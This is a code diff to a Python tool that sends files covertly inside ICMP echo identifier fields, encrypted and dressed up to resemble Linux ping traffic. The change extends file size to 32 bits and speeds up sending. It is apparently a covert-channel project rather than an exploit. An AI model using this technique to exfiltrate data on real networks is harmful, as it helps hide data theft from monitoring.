@@ -29,10 +29,10 @@ CMD_TRANSFER_FILE = 2
 ACK_READY = 0xFFFE
 
 # File transfer settings.
-MAX_TRANSFER_BYTES = 0xFFFF                  # file size must fit in one 16-bit identifier
+MAX_TRANSFER_BYTES = 0xFFFFFFFF              # file size fits in 32-bit (two 16-bit header packets)
 MAX_FILENAME_BYTES = 0xFFFF                  # filename length must fit in one 16-bit identifier
 READY_TIMEOUT_SECONDS = 5.0
-FILE_PACKET_DELAY_SECONDS = 0.002
+FILE_PACKET_DELAY_SECONDS = 0.0001
 
 # Mimic Linux `ping`: 8-byte timestamp slot (zeroed) + 48 bytes of the
 # 0x10..0x3F filler pattern. hostb ignores this payload — it only reads
@@ -410,39 +410,23 @@ def transfer_file(ctx: Context):
 
         print("hostb is ready. Sending file...")
 
-        def send_chunked(source: bytes, start_sequence: int, label: str) -> int:
-            length = len(source)
-            num_packets = (length + 1) // 2
-            for chunk_index in range(num_packets):
-                sequence = start_sequence + chunk_index
-                byte_offset = chunk_index * 2
-                high = source[byte_offset]
-                low = source[byte_offset + 1] if byte_offset + 1 < length else 0
-                chunk_value = (high << 8) | low
-                try:
-                    send_icmp_identifier(
-                        send_socket, ctx.source_ip, ctx.destination_ip,
-                        encrypt_identifier(chunk_value), sequence,
-                    )
-                except OSError as exc:
-                    ctx.error_message = f"failed to send {label} packet {sequence}: {exc}"
-                    ctx.error_code = 2
-                    handle_error(ctx)
-                if FILE_PACKET_DELAY_SECONDS > 0:
-                    time.sleep(FILE_PACKET_DELAY_SECONDS)
-            return num_packets
-
-        # Header: seq=1 filename length, seq=2 file size.
+        # Header: seq=1 file_size high16, seq=2 file_size low16, seq=3 filename length.
         try:
             send_icmp_identifier(
                 send_socket, ctx.source_ip, ctx.destination_ip,
-                encrypt_identifier(filename_length), 1,
+                encrypt_identifier((file_size >> 16) & 0xFFFF), 1,
             )
             if FILE_PACKET_DELAY_SECONDS > 0:
                 time.sleep(FILE_PACKET_DELAY_SECONDS)
             send_icmp_identifier(
                 send_socket, ctx.source_ip, ctx.destination_ip,
-                encrypt_identifier(file_size), 2,
+                encrypt_identifier(file_size & 0xFFFF), 2,
+            )
+            if FILE_PACKET_DELAY_SECONDS > 0:
+                time.sleep(FILE_PACKET_DELAY_SECONDS)
+            send_icmp_identifier(
+                send_socket, ctx.source_ip, ctx.destination_ip,
+                encrypt_identifier(filename_length), 3,
             )
             if FILE_PACKET_DELAY_SECONDS > 0:
                 time.sleep(FILE_PACKET_DELAY_SECONDS)
@@ -451,11 +435,40 @@ def transfer_file(ctx: Context):
             ctx.error_code = 2
             handle_error(ctx)
 
-        # seq=3..M+2 filename bytes, then seq=M+3..M+2+P file bytes.
-        sent_filename = send_chunked(filename_bytes, 3, "filename")
-        send_chunked(file_bytes, 3 + sent_filename, "data")
+        # Body: filename bytes followed by file data bytes, two bytes per
+        # packet. Logical sequence increments forever; wire sequence wraps
+        # at 16 bits. Receiver appends body packets in arrival order, so
+        # this works as long as the network preserves order (LAN does).
+        body_stream = filename_bytes + file_bytes
+        body_total = (len(body_stream) + 1) // 2
+        log_interval = max(1000, body_total // 100)
+        logical_seq = 4
+        for i in range(0, len(body_stream), 2):
+            high = body_stream[i]
+            low = body_stream[i + 1] if i + 1 < len(body_stream) else 0
+            chunk_value = (high << 8) | low
+            try:
+                send_icmp_identifier(
+                    send_socket, ctx.source_ip, ctx.destination_ip,
+                    encrypt_identifier(chunk_value), logical_seq & 0xFFFF,
+                )
+            except OSError as exc:
+                ctx.error_message = (
+                    f"failed to send body packet (logical seq {logical_seq}): {exc}"
+                )
+                ctx.error_code = 2
+                handle_error(ctx)
 
-        total_packets = 2 + num_filename_packets + num_data_packets
+            body_index = logical_seq - 3
+            if body_index % log_interval == 0:
+                pct = (body_index * 100) // body_total
+                print(f"  ... sent {body_index}/{body_total} body packets ({pct}%)")
+
+            logical_seq += 1
+            if FILE_PACKET_DELAY_SECONDS > 0:
+                time.sleep(FILE_PACKET_DELAY_SECONDS)
+
+        total_packets = 3 + body_total
         print(
             f"Transfer complete: sent {total_packets} ICMP packets "
             f"({filename_length} byte name + {file_size} byte file)."
